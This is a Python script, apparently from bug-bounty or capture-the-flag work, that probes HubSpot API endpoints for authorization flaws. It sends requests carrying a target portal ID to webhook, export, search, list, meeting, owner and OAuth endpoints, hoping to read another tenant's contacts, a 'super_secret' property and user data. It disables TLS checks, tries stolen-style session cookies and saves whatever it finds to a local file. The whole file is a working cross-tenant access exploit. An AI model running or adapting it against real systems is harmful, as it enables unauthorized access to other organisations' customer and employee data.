#!/usr/bin/env python3
"""
Test Uncommon API Endpoints
Less obvious endpoints that might have authorization bugs
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
CLIENT_SECRET = os.getenv('HUBSPOT_CLIENT_SECRET')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*70)
print(" Testing Uncommon API Endpoints")
print("="*70)

findings = []

# ============================================================================
# 1. WEBHOOKS AND NOTIFICATIONS
# ============================================================================

def test_webhooks():
    """Test webhook-related endpoints"""
    print("\n[*] Testing webhook endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    webhook_urls = [
        f'https://api.hubapi.com/webhooks/v3/{TARGET_PORTAL}/settings',
        f'https://api.hubapi.com/webhooks/v3/{TARGET_PORTAL}/subscriptions',
        f'https://api.hubapi.com/crm/v3/timeline/events?objectId=1&objectType=contact',
    ]

    for url in webhook_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data:
                    findings.append({'type': 'webhook', 'url': url, 'data': data})
                    print(f"     Got data: {json.dumps(data)[:150]}")
        except:
            pass

# ============================================================================
# 2. EXPORTS AND BULK OPERATIONS
# ============================================================================

def test_exports():
    """Test export endpoints"""
    print("\n[*] Testing export endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}', 'Content-Type': 'application/json'}

    # Try to export contacts from target portal
    export_urls = [
        'https://api.hubapi.com/crm/v3/objects/contacts/batch/read',
        'https://api.hubapi.com/crm/v3/exports/contacts',
    ]

    # Payload to export contacts
    export_payload = {
        'properties': ['firstname', 'super_secret', 'email'],
        'inputs': [{'id': '1'}],
        'idProperty': 'id'
    }

    for url in export_urls:
        try:
            # Try with target portal in URL
            test_url = f"{url}?portalId={TARGET_PORTAL}"
            r = requests.post(test_url, headers=headers, json=export_payload, verify=False, timeout=10)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code in [200, 207]:  # 207 = Multi-Status
                data = r.json()
                print(f"    Response: {json.dumps(data)[:200]}")

                if 'results' in data and data['results']:
                    findings.append({'type': 'export', 'url': url, 'data': data})
        except Exception as e:
            print(f"    Error: {str(e)[:50]}")

# ============================================================================
# 3. LISTS AND SEGMENTS
# ============================================================================

def test_lists():
    """Test list-related endpoints"""
    print("\n[*] Testing list endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    list_urls = [
        f'https://api.hubapi.com/contacts/v1/lists?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/contacts/v1/lists/all/contacts/all?count=100&portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/crm/v3/lists?portalId={TARGET_PORTAL}',
    ]

    for url in list_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data and ('contacts' in data or 'lists' in data):
                    findings.append({'type': 'lists', 'url': url, 'data': data})
                    print(f"     Got data!")
        except:
            pass

# ============================================================================
# 4. TIMELINE AND ACTIVITY
# ============================================================================

def test_timeline():
    """Test timeline/activity endpoints"""
    print("\n[*] Testing timeline endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    timeline_urls = [
        f'https://api.hubapi.com/crm/v3/timeline/events?objectType=contact&objectId=1&portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/engagements/v1/engagements/associated/CONTACT/1?limit=100&portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/crm/v3/objects/contacts/1/associations/notes?portalId={TARGET_PORTAL}',
    ]

    for url in timeline_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4] if len(url.split('/')) > 4 else 'timeline'}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                findings.append({'type': 'timeline', 'url': url, 'data': data})
        except:
            pass

# ============================================================================
# 5. MEETINGS/CALENDAR
# ============================================================================

def test_meetings():
    """Test meetings/calendar endpoints"""
    print("\n[*] Testing meetings endpoints...")

    # Since we found a public meetings page, let's try the API
    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Also try with session cookies
    cookie_headers = {'Cookie': SESSION_COOKIES} if SESSION_COOKIES else {}

    meeting_urls = [
        f'https://api.hubapi.com/calendar/v1/events?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/meetings/v1/meetings/contact/1?portalId={TARGET_PORTAL}',
        f'https://app.hubspot.com/api/meetings/v1/contact/1?portalId={TARGET_PORTAL}',
    ]

    for url in meeting_urls:
        # Try with token
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4]} (token): {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data:
                    findings.append({'type': 'meetings', 'url': url, 'data': data})
        except:
            pass

        # Try with cookies
        if cookie_headers:
            try:
                r = requests.get(url, headers=cookie_headers, verify=False, timeout=10)
                print(f"  {url.split('/')[4]} (cookie): {r.status_code}")

                if r.status_code == 200:
                    data = r.json()
                    if data:
                        findings.append({'type': 'meetings', 'url': url, 'data': data})
            except:
                pass

# ============================================================================
# 6. SEARCH AND FILTERS
# ============================================================================

def test_search_filters():
    """Test search with various filters"""
    print("\n[*] Testing search with filters...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}', 'Content-Type': 'application/json'}

    # Try different search queries
    search_payloads = [
        # Search for contacts created recently
        {
            'filterGroups': [{
                'filters': [{
                    'propertyName': 'createdate',
                    'operator': 'GTE',
                    'value': '0'
                }]
            }],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100
        },
        # Search with email filter
        {
            'filterGroups': [{
                'filters': [{
                    'propertyName': 'email',
                    'operator': 'HAS_PROPERTY'
                }]
            }],
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100
        },
        # Empty filter (try to get all)
        {
            'properties': ['firstname', 'super_secret', 'email'],
            'limit': 100
        }
    ]

    for i, payload in enumerate(search_payloads, 1):
        try:
            url = f'https://api.hubapi.com/crm/v3/objects/contacts/search?portalId={TARGET_PORTAL}'
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  Search {i}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if data.get('results'):
                    print(f"     Found {len(data['results'])} contacts!")
                    findings.append({'type': 'search', 'payload': payload, 'data': data})
        except Exception as e:
            print(f"    Error: {str(e)[:50]}")

# ============================================================================
# 7. IMPORTS
# ============================================================================

def test_imports():
    """Test import-related endpoints"""
    print("\n[*] Testing import endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    import_urls = [
        f'https://api.hubapi.com/crm/v3/imports?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/contacts/v1/contact/batch/?portalId={TARGET_PORTAL}',
    ]

    for url in import_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                findings.append({'type': 'imports', 'url': url, 'data': data})
        except:
            pass

# ============================================================================
# 8. OWNERS AND USERS
# ============================================================================

def test_owners():
    """Test owner/user enumeration"""
    print("\n[*] Testing owner endpoints...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    owner_urls = [
        f'https://api.hubapi.com/owners/v2/owners?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/settings/v3/users?portalId={TARGET_PORTAL}',
    ]

    for url in owner_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                findings.append({'type': 'owners', 'url': url, 'data': data})
                print(f"     Got owner data!")
        except:
            pass

# ============================================================================
# 9. OAUTH WITH CLIENT SECRET
# ============================================================================

def test_oauth():
    """Test OAuth flows with client secret"""
    print("\n[*] Testing OAuth endpoints...")

    if not CLIENT_SECRET:
        print("   No client secret available")
        return

    # Try to get access token for target portal (will likely fail)
    oauth_url = 'https://api.hubapi.com/oauth/v1/token'

    # This won't work without authorization code, but let's try
    payload = {
        'grant_type': 'client_credentials',
        'client_id': ACCESS_TOKEN.split('-')[2] if '-' in ACCESS_TOKEN else ACCESS_TOKEN,
        'client_secret': CLIENT_SECRET,
        'portal_id': TARGET_PORTAL
    }

    try:
        r = requests.post(oauth_url, data=payload, verify=False, timeout=10)
        print(f"  OAuth token: {r.status_code}")
        print(f"    Response: {r.text[:200]}")

        if r.status_code == 200:
            findings.append({'type': 'oauth', 'data': r.json()})
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

# ============================================================================
# MAIN
# ============================================================================

test_webhooks()
test_exports()
test_lists()
test_timeline()
test_meetings()
test_search_filters()
test_imports()
test_owners()
test_oauth()

print("\n" + "="*70)
print(f" Testing Complete!")
print(f" Findings: {len(findings)}")
print("="*70)

if findings:
    print("\n Found interesting data:\n")
    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['type']}")
        print(f"   {json.dumps(finding, indent=3)[:250]}...")

    with open('/home/user/Hub/findings/uncommon_endpoints.json', 'w') as f:
        json.dump(findings, f, indent=2)
    print(f"\n Saved to: findings/uncommon_endpoints.json")
else:
    print("\n No accessible endpoints found.")
